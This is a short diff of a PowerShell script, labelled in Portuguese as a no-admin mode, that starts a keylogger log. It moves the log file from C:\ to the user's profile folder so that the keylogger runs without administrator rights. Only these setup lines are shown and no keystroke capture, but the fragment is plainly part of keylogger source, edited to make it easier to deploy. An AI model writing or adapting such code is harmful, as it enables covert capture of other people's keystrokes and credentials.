@@ -2,7 +2,7 @@
 Write-Host "=== (Modo Sem Admin) ===" -ForegroundColor Green
 
 # Usa pasta do usuário atual (não precisa de admin)
-$arquivo = "C:\log.txt"
+$arquivo = "$env:USERPROFILE\log.txt"
 
 "=== Keylogger iniciado em $(Get-Date) ===" | Out-File -FilePath $arquivo -Encoding UTF8 -Force
 
